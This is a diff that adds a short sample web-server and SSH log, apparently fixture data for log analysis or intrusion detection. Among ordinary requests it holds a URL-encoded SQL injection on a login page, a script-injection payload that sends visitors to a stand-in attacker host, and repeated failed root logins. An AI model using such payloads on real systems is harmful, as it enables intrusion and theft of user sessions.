@@ -1,0 +1,8 @@
+192.168.1.15 - - [23/Oct/2026:14:02:10 +0300] "GET /index.html HTTP/1.1" 200 4520 "-" "Mozilla/5.0"
+192.168.1.42 - - [23/Oct/2026:14:02:11 +0300] "GET /static/css/main.css HTTP/1.1" 200 1205 "-" "Chrome/120.0"
+185.220.101.5 - - [23/Oct/2026:14:02:15 +0300] "GET /login.php?user=admin%27+OR+%271%27=%271 HTTP/1.1" 200 4522 "-" "Mozilla/5.0"
+103.251.167.20 - - [23/Oct/2026:14:02:18 +0300] "GET /comment.php?msg=%3Cscript%3Edocument.location=%27http://attacker.xyz/steal%27%3C/script%3E HTTP/1.1" 200 1204 "-" "Mozilla/5.0"
+Oct 23 14:02:22 server sshd[12450]: Accepted publickey for devops from 192.168.1.105 port 45220 ssh2
+Oct 23 14:02:25 server sshd[18421]: Failed password for invalid user root from 45.142.120.19 port 63850 ssh2
+Oct 23 14:02:27 server sshd[18424]: Failed password for root from 45.142.120.19 port 63852 ssh2
+Oct 23 14:02:30 server sshd[18432]: Maximum authentication attempts exceeded for root from 45.142.120.19 port 63854 ssh2 [preauth]
